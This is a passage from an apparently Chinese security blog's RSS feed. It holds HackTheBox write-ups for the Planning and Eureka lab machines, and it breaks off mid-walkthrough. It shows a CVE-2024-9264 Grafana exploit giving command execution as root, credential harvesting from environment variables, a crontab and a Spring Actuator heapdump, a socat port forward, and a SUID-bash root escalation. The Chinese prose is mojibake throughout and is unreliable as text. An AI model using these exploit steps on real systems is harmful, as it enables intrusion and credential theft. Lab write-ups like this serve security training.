1. https://github.com/nollium/CVE-2024-9264 å¯ä»¥è¿›è¡Œ LFI å’Œ RCE ï¼Œä½†æ˜¯è¦éªŒè¯å
2. https://grafana.com/blog/2024/08/14/grafana-security-release-medium-severity-security-fix-for-cve-2024-6837/ XSS æ¼æ´

ç„¶åå‘ç°ï¼š

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image4.png)

```bash
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
```

å¾—åˆ°å¯†ç  `admin`/`0D5oT70Fq13EvB5r`

å°è¯•åˆ©ç”¨ `CVE-2024-9264`

```bash
(Planning) âœ  CVE-2024-9264 git:(main) âœ— python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb
```

æˆåŠŸåˆ©ç”¨

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image5.png)

```bash
(Planning) âœ  CVE-2024-9264 git:(main) âœ— python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: whoami
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
root
```

æˆ‘ä»¬åœ¨ Docker ç¯å¢ƒä¸­

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image6.png)

è¿›è¡Œåå¼¹ `shell`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image7.png)

## Docker é€ƒé€¸

åå¼¹ `shell` åå¯¹ `shell` è¿›è¡Œä¼˜åŒ– ï¼šhttps://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/

åœ¨ `env` å‘½ä»¤è¾“å‡ºä¸­ï¼Œèƒ½æ‰¾åˆ° 

```bash
root@7ce659d667d7:~# env    
...      
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
...
```

å°è¯•ç”¨æ”¹å‡­æ®è¿›è¡Œ SSH ç™»å½•

```bash
âœ  Planning ssh enzo@planning.htb 
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 11 06:26:45 AM UTC 2025

  System load:           0.13
  Usage of /:            77.6% of 6.30GB
  Memory usage:          43%
  Swap usage:            16%
  Processes:             294
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4d58

  => There are 43 zombie processes.

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 11 06:27:42 2025 from 10.10.16.12
enzo@planning:~$ 
```

æˆåŠŸè¿›å…¥â€¦

## ææƒ - To Root

### ä¿¡æ¯æ”¶é›†

åœ¨å½“å‰ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ° `user.txt`

```bash
enzo@planning:~$ cat user.txt 
97cbc3d1ee1c848ab5255a90dc366206
```

ä¸Šä¼  `Linpeas` æ”¶é›†ä¿¡æ¯

```bash
â•”â•â•â•â•â•â•â•â•â•â•â•£ SUID - Check easy privesc, exploits and write perms
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 19K Dec  2 11:59 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 335K Apr 22 11:51 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 39K Dec  5 02:26 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 51K Dec  5 02:26 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 272K Apr  8  2024 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 55K Dec  5 02:26 /usr/bin/su
-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 1.4M May 11 04:23 /tmp/bash
```

```bash
â•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:37777         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

æ³¨æ„åˆ°å¾ˆå¤šåªæœ‰æœ¬æœºå¼€æ”¾çš„ç«¯å£ï¼Œ3000 æ˜¯ Grafanaï¼Œ`8000` ä¸æ¸…æ¥š

å°† `8000`ç«¯å£è½¬å‘å‡ºå»

```bash
enzo@planning:/tmp$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &
[1] 2124
```

éœ€è¦è´¦å·å¯†ç ï¼Œ`enzo`çš„å‡­æ®ä¸æ­£ç¡®

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image8.png)

å›åˆ° enzo ä¸­å†å¯»æ‰¾ä¸€ä¸‹ä¿¡æ¯

åœ¨ `/opt/crontabs` æ‰¾åˆ° `crontab.db`  

```bash
enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

è¿™äº›æ˜¯è®¡åˆ’ä»»åŠ¡

```bash
# Grafana Docker é•œåƒå¤‡ä»½ï¼Œæ¯å¤© 00:00 æ‰§è¡Œ
0 0 * * * root /usr/bin/docker save root_grafana -o /var/backups/grafana.tar \
  && /usr/bin/gzip /var/backups/grafana.tar \
  && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \
  && rm /var/backups/grafana.tar.gz
```

```bash
# æ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡æ¸…ç†è„šæœ¬
* * * * * root /root/scripts/cleanup.sh
```

å…¶ä¸­ `Grafana Docker` è®¡åˆ’ä»»åŠ¡ä¸­èƒ½å¾—åˆ°ä¸€ä¸ªå¯†ç  `P4ssw0rdS0pRi0T3c`

æˆ‘ä»¬åˆ° `Web` ä¸Šå°è¯•ä½¿ç”¨è¯¥å¯†ç è¿›è¡Œç™»å½•ï¼Œæœ€åä½¿ç”¨ `root:P4ssw0rdS0pRi0T3c` æˆåŠŸè¿›å…¥åå°

### Crontab ææƒ

åå°æ˜¯ `Crontab UI`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image9.png)

æˆ‘ä»¬çœ‹åˆ°ä¸Šé¢çš„è®¡åˆ’ä»»åŠ¡æ˜¯ä»¥ `root` æ‰§è¡Œçš„ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ–°å»ºè®¡åˆ’ä»»åŠ¡ï¼ˆè¿™é‡Œæ–¹æ³•å¾ˆå¤šäº†ï¼Œéšä¾¿ rootï¼‰

ç›´æ¥è¿›è¡Œåå¼¹ `shell` ï¼ˆå¤±è´¥ï¼‰

ç»™ `/bin/bash` è®¾ç½® `sid`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image10.png)

è·å– Root

```bash
enzo@planning:/opt/crontabs$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
enzo@planning:/opt/crontabs$ /bin/bash -p
bash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
bash-5.2# cd /root
bash-5.2# ls
root.txt  scripts
bash-5.2# cat root.txt 
4f1ad996a454ef10623bfb578c0134ba
```

## æ€»ç»“

æ‰“çš„ç³Šé‡Œç³Šæ¶‚çš„ï¼Œå¹¶ä¸ç®—éš¾ã€‚ä½†æ˜¯å‡­æ®æ”¾åœ¨ **Machine Information** é‡Œé¢æˆ‘æ˜¯çœŸæƒ³ä¸åˆ°â€¦

æ¯ä¸ªç‚¹éƒ½æ„Ÿè§‰æ²¡æœ‰ä¸²è”èµ·æ¥ï¼Œå‰²è£‚æ„Ÿä¸¥é‡ã€‚]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linuxé¶æœº</category>
            <category>Grafana</category>
            <category>Crontab</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Eureka]]></title>
            <link>https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka</guid>
            <pubDate>Mon, 28 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Eureka https://app.hackthebox.com/machines/Eureka | Hard PSï¼šå°¤é‡Œå¡å‘åŠ¨ï¼æ‰€æœ‰å¥‡è§‚å»ºé€ æé€Ÿ 30% ! å‰æœŸè¸©ç‚¹ Web æ¸—é€ ä¿¡æ¯æ”¶é›† WhatWeb é¡µé¢ä¸Šçš„ä¸€äº›æ“ä½œè¦è¿›è¡Œç™»é™†åæ‰èƒ½è¿›è¡Œæ“ä½œ æŠ“ä¸ªåŒ…åˆ†æä¸€ä¸‹æ¡†æ¶ nginx...]]></description>
            <content:encoded><![CDATA[# Machine - Eureka

> https://app.hackthebox.com/machines/Eureka | `Hard`
> 

PSï¼šå°¤é‡Œå¡å‘åŠ¨ï¼æ‰€æœ‰å¥‡è§‚å»ºé€ æé€Ÿ 30% !

## å‰æœŸè¸©ç‚¹

```bash
âœ  Eureka nmap -sT -min-rate 10000 -p- 10.10.11.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:28 EDT
Nmap scan report for 10.10.11.66
Host is up (0.15s latency).
Not shown: 65493 filtered tcp ports (no-response), 40 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
âœ  Eureka nmap -sT -A -T4 -O -p 22,80 10.10.11.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:36 EDT
Nmap scan report for eureka.htb (10.10.11.66)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   442.32 ms 10.10.16.1
2   139.60 ms eureka.htb (10.10.11.66)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.95 seconds
```

## Web æ¸—é€

### ä¿¡æ¯æ”¶é›†

WhatWeb

```bash
âœ  Eureka whatweb furni.htb                                                                             
http://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image.png)

é¡µé¢ä¸Šçš„ä¸€äº›æ“ä½œè¦è¿›è¡Œç™»é™†åæ‰èƒ½è¿›è¡Œæ“ä½œ

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image1.png)

æŠ“ä¸ªåŒ…åˆ†æä¸€ä¸‹æ¡†æ¶

```bash
âœ  Eureka curl -i http://furni.htb                                                                                                                                                                                                  
HTTP/1.1 200 OK                                                                                                                                                                                                                     
Server: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                       
Date: Sun, 27 Apr 2025 06:48:57 GMT                                                                                                                                                                                                 
Content-Type: text/html;charset=UTF-8                                                                                                                                                                                               
Transfer-Encoding: chunked                                                                                                                                                                                                          
Connection: keep-alive                                                                                                                                                                                                              
Vary: Origin                                                                                                                                                                                                                        
Vary: Access-Control-Request-Method                                                                                                                                                                                                 
Vary: Access-Control-Request-Headers                                                                                                                                                                                                
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US
```

**nginx** æ˜¯å‰ç«¯ Web Serverï¼ˆåä»£æˆ–ç›´æ¥æœåŠ¡ï¼‰ã€‚

**Content-Type æ˜¯ text/html;charset=UTF-8**ï¼Œä¸€èˆ¬å°±æ˜¯æ ‡å‡†ç½‘é¡µã€‚

**X-Content-Type-Options: nosniff** å’Œ **X-Frame-Options: DENY** è¿™äº›æ˜¯å¸¸è§çš„å®‰å…¨ HTTP å¤´ï¼Œä¸€èˆ¬ Javaã€Spring Bootã€æˆ–è€… ASP.NET Core è¿™ç§ç°ä»£åç«¯æ¡†æ¶ä¼šåŠ ä¸Šè¿™äº›å¤´ã€‚

**Cache-Control: no-cache, no-store, max-age=0, must-revalidate**ï¼Œè¿™ç§å¼ºåˆ¶ç¦æ­¢ç¼“å­˜çš„ç­–ç•¥ï¼Œä¹Ÿå¸¸è§äº **Spring Boot**ï¼Œå°¤å…¶æ˜¯é»˜è®¤æ¨¡æ¿ç”Ÿæˆçš„ç½‘ç«™ã€‚

å†åŠ ä¸Š `Content-Language: en-US`ï¼Œå’Œ `Pragma: no-cache` è¿™ç§å†™æ³•ï¼Œä¹Ÿå¾ˆåƒ Java ç³»åˆ—åº”ç”¨ã€‚

**æ‰€ä»¥ï¼Œç»¼åˆæ¥çœ‹ï¼Œåç«¯å¾ˆå¯èƒ½æ˜¯ Java ç³»çš„æ¡†æ¶ï¼Œææœ‰å¯èƒ½æ˜¯**ï¼š**Spring Boot**

---

ç›®å½•æ‰«æä¹Ÿç¡®å®šäº†è¿™ä¸€ç‚¹ï¼Œæ‰«æå‡ºæ¥äº†`/actuator` ç›®å½•ï¼Œå¹¶ä¸”è¿”å› 200

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image2.png)

### Spring acturtor æœªæˆæƒ

å­˜åœ¨æœªæˆæƒè®¿é—®

```bash
curl http://furni.htb/actuator/env
```

èƒ½å‘ç°ç½‘ç«™æ ¹ç›®å½•ï¼š`/var/www/web/Furni`

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image3.png)

å¹¶ä¸”ç›®å½•æ‰«æä¸­è¿˜ä»æ‰«æå‡ºæ¥äº† `/actuator/heapdump` ï¼ˆ`Heap dump` ä¸ºæ¸—é€æµ‹è¯•è€…æä¾›äº†å¯¹å†…å­˜ä¸­æ‰€æœ‰å¯¹è±¡çš„å¯è§†åŒ–è®¿é—®ï¼Œæ˜¯å‘ç°å’ŒéªŒè¯æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä¸šåŠ¡é€»è¾‘ç¼ºé™·åŠå†…å­˜ç ´åæ¼æ´çš„é‡è¦æ‰‹æ®µã€‚ï¼‰

```bash
[03:08:56] 200 -   76MB - /actuator/heapdump
```

```bash
âœ  Eureka curl http://furni.htb/actuator/heapdump --output heapdump 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 76.4M  100 76.4M    0     0  1472k      0  0:00:53  0:00:53 --:--:--  477k
```

ä½¿ç”¨ å·¥å…·å¯¹å…¶è¿›è¡Œåˆ†æ

```bash
âœ  Eureka java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                                                      
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                                                       
===========================================                                                                                                                                                                                         
SpringDataSourceProperties
-------------
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190
===========================================
HikariDataSource
-------------
java.lang.NumberFormatException: Cannot parse null string 
===========================================
OriginTrackedMapPropertySource
-------------                  
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver
spring.cloud.inetutils.ignoredInterfaces = enp0s.*
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native   
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.application.name = Furni
server.port = 8082
spring.jpa.properties.hibernate.format_sql = true
spring.session.store-type = jdbc           
spring.jpa.hibernate.ddl-auto = none
-------------                                                
UserPassSearcher                           
.... many Message ....
```

å–‚ç»™GPTä¸Šè¿›è¡Œåˆ†æï¼Œå…¶ä¸­æœ€å…³é”®çš„ä¿¡æ¯æ˜¯ï¼š

```bash
username = oscar190  
password = 0sc@r190_S0l!dP@sswd  
url      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  
```

| é…ç½®é¡¹ | å«ä¹‰ | å®‰å…¨å½±å“ï¼é£é™© |
| --- | --- | --- |
| `management.endpoints.web.exposure.include = *` | Actuator æš´éœ²æ‰€æœ‰ç®¡ç†ç«¯ç‚¹ï¼ˆåŒ…æ‹¬ `/heapdump`, `/env`, `/beans` ç­‰ï¼‰ | **é«˜å±**ï¼šæ”»å‡»è€…å¯è®¿é—®ä»»æ„ç®¡ç†ç«¯ç‚¹ï¼Œä¸‹è½½å †å¿«ç…§ã€æŸ¥çœ‹ç¯å¢ƒå˜é‡ã€åŠ¨æ€ä¿®æ”¹æ—¥å¿—çº§åˆ«ï¼Œç”šè‡³æ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚ |
| `spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver` | JDBC é©±åŠ¨ç±»ï¼Œä½¿ç”¨ MySQL Connector/J | æ— ç›´æ¥é£é™©ï¼Œä½†è¡¨æ˜åç»­ URLã€å‡­æ®å¯ç”¨äº MySQL è¿æ¥ã€‚ |
| `spring.cloud.inetutils.ignoredInterfaces = enp0s.*` | Spring Cloud InetUtils å¿½ç•¥ä»¥ `enp0s.*` å‘½åçš„ç½‘ç»œæ¥å£ | è¾ƒä½é£é™©ï¼›å½±å“æœåŠ¡æ³¨å†Œæ—¶è®°å½•çš„ IPï¼Œä¸å®é™…å¯è¾¾ IP å¯èƒ½ä¸ä¸€è‡´ã€‚ |
| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka å®¢æˆ·ç«¯æ³¨å†Œä¸­å¿ƒåœ°å€ï¼ŒåŒ…å«æ˜æ–‡ç”¨æˆ·åå’Œå¯†ç  | **é«˜å±**ï¼šå¯æŸ¥è¯¢/ä¸‹çº¿å…¶ä»–å¾®æœåŠ¡å®ä¾‹ï¼Œç ´åæœåŠ¡å¯ç”¨æ€§æˆ–çªƒå–æ›´å¤šé…ç½®ä¿¡æ¯ã€‚ |
| `server.forward-headers-strategy = native` | ä»£ç†ç¯å¢ƒä¸‹è½¬å‘ HTTP å¤´ï¼ˆå¦‚ X-Forwarded-*ï¼‰ | è¾ƒä½é£é™©ï¼›å¯èƒ½å½±å“æ—¥å¿—ä¸­è®°å½•çš„çœŸå®å®¢æˆ·ç«¯ IPï¼Œä½†å¯¹æ¸—é€ä»·å€¼æœ‰é™ã€‚ |
| `spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB` | JDBC è¿æ¥ URLï¼ŒæŒ‡å‘æœ¬åœ° MySQL æ•°æ®åº“ | å·²ç»“åˆå‡­æ®å¯ç›´æ¥è¿æ¥æ•°æ®åº“ï¼Œè‹¥æ•°æ®åº“å…è®¸è¿è¡Œå¤–éƒ¨è¿æ¥ï¼Œå¯è¿œç¨‹åˆ©ç”¨ã€‚ |
| `spring.application.name = Furni` | åº”ç”¨åœ¨ Eureka æˆ–å…¶ä»–æ³¨å†Œä¸­å¿ƒä¸­çš„åç§° | ä½é£é™©ï¼›å¯ç”¨äºè¯†åˆ«æœåŠ¡æ‹“æ‰‘ï¼Œä½†å¯¹æ”»å‡»æ— ç›´æ¥å¸®åŠ©ã€‚ |
| `server.port = 8082` | åº”ç”¨ç›‘å¬çš„ HTTP ç«¯å£ | æ­ç¤ºå¯è®¿é—®çš„ç«¯å£ï¼Œæ¸—é€æµ‹è¯•æ—¶å¯é’ˆå¯¹è¯¥ç«¯å£è¿›è¡Œæ¢æµ‹ä¸æ”»å‡»ã€‚ |
| `spring.jpa.properties.hibernate.format_sql = true` | Hibernate æ‰“å° SQL æ—¶æ ¼å¼åŒ–è¾“å‡º | ä½é£é™©ï¼›ä»…å½±å“æ—¥å¿—å¯è¯»æ€§ï¼Œæ— å®‰å…¨å½±å“ã€‚ |
| `spring.session.store-type = jdbc` | Spring Session å­˜å‚¨ç­–ç•¥ï¼Œè¡¨ç¤ºä¼šè¯æ•°æ®å­˜å…¥æ•°æ®åº“ | ä¸­ç­‰é£é™©ï¼šä¼šè¯ä¿¡æ¯ã€Session ID å­˜åº“ï¼Œæ”»å‡»è€…å¯å°è¯•è¯»å–æˆ–ç¯¡æ”¹ä¼šè¯è¡¨ä»¥è¿›è¡Œä¼šè¯å›ºå®šæˆ–åŠ«æŒã€‚ |
| `spring.jpa.hibernate.ddl-auto = none` | Hibernate ä¸ä¼šè‡ªåŠ¨åˆ›å»ºã€æ›´æ–°æˆ–éªŒè¯æ•°æ®åº“ç»“æ„ | ä½é£é™©ï¼›è¡¨ç¤ºåº”ç”¨ä¸ä¼šä¿®æ”¹è¡¨ç»“æ„ã€‚ |

### Spring Eureka

Spring Eureka æ˜¯ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œæ˜¯ç”¨æ¥å®ç°å¾®æœåŠ¡ä¹‹é—´**è‡ªåŠ¨æ³¨å†Œå’Œå‘ç°**çš„å·¥å…·

åˆ†æä¸­å‘ç°ï¼Œè´¦å·å¯†ç ä¹Ÿå±•ç¤ºå‡ºæ¥äº† `EurekaSrvr:0scarPWDisTheB3st`

| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka å®¢æˆ·ç«¯æ³¨å†Œä¸­å¿ƒåœ°å€ï¼ŒåŒ…å«æ˜æ–‡ç”¨æˆ·åå’Œå¯†ç  | **é«˜å±**ï¼šå¯æŸ¥è¯¢/ä¸‹çº¿å…¶ä»–å¾®æœåŠ¡å®ä¾‹ï¼Œç ´åæœåŠ¡å¯ç”¨æ€§æˆ–çªƒå–æ›´å¤šé…ç½®ä¿¡æ¯ã€‚ |
| --- | --- | --- |

èƒ½å‘ç°æœåŠ¡å™¨åœ¨å¥½å‡ ä¸ªç«¯å£è¿è¡Œç€æœåŠ¡

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image4.png)

## ææƒ - To Miranda

### ä¿¡æ¯æ”¶é›†

ä¹‹å‰ä¸Šé¢è¿˜å‘ç°å‘¢ä¸€ç»„è´¦å·å¯†ç `oscar190:0sc@r190_S0l!dP@sswd`

å°è¯• SSH ç™»å½•ï¼Œå‘ç°æˆåŠŸäº†

```bash
âœ  Eureka ssh oscar190@10.10.11.66
The authenticity of host '10.10.11.66 (10.10.11.66)' can't be established.
ED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.66' (ED25519) to the list of known hosts.
oscar190@10.10.11.66's password: 

Last login: Sun Apr 27 07:31:27 2025 from 10.10.16.59
oscar190@eureka:~$ 
```

ç”¨æˆ·ä¿¡æ¯

```bash
oscar190@eureka:/home$ ls
miranda-wise  oscar190
```

ç›‘å¬çš„ç«¯å£

```bash
oscar190@eureka:~$ ss -tulpn
Netid                 State                   Recv-Q                  Send-Q                                        Local Address:Port                                    Peer Address:Port                 Process                 
udp                   UNCONN                  0                       0                                             127.0.0.53%lo:53                                           0.0.0.0:*                                            
udp                   UNCONN                  0                       0                                                         *:37093                                              *:*                                            
udp                   UNCONN                  0                       0                                                         *:49730                                              *:*                                            
udp                   UNCONN                  0                       0                                                         *:52181                                              *:*                                            
udp                   UNCONN                  0                       0                                                         *:36551                                              *:*                                            
tcp                   LISTEN                  0                       511                                                 0.0.0.0:80                                           0.0.0.0:*                                            
tcp                   LISTEN                  0                       4096                                          127.0.0.53%lo:53                                           0.0.0.0:*                                            
tcp                   LISTEN                  0                       128                                                 0.0.0.0:22                                           0.0.0.0:*                                            
tcp                   LISTEN                  0                       80                                                127.0.0.1:3306                                         0.0.0.0:*                                            
tcp                   LISTEN                  0                       4096                                     [::ffff:127.0.0.1]:8080                                               *:*                                            
tcp                   LISTEN                  0                       511                                                    [::]:80                                              [::]:*                                            
tcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8081                                               *:*                                            
tcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8082                                               *:*                                            
tcp                   LISTEN                  0                       128                                                    [::]:22                                              [::]:*                                            
tcp                   LISTEN                  0                       100                                                       *:8761                                               *:*  
```

ç»“åˆä¹‹å‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹æ•°æ®åº“

```bash
username = oscar190  
password = 0sc@r190_S0l!dP@sswd  
url      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  
```

```bash
oscar190@eureka:/home$ mysql -uoscar190 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 400
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

```bash
ariaDB [Furni_WebApp_DB]> select * from SPRING_SESSION;                                                                                                                                                                            
+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+                                                 
| PRIMARY_ID                           | SESSION_ID                           | CREATION_TIME | LAST_ACCESS_TIME | MAX_INACTIVE_INTERVAL | EXPIRY_TIME   | PRINCIPAL_NAME         |                                                 
+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+ 
| 10233918-ae1b-42fb-be6f-5f9964cf1bd4 | 4e178510-cbab-422a-9aec-2d220d4aac84 | 1745739662223 |    1745739664438 |                  1800 | 1745741464438 | miranda.wise@furni.htb |                                                 
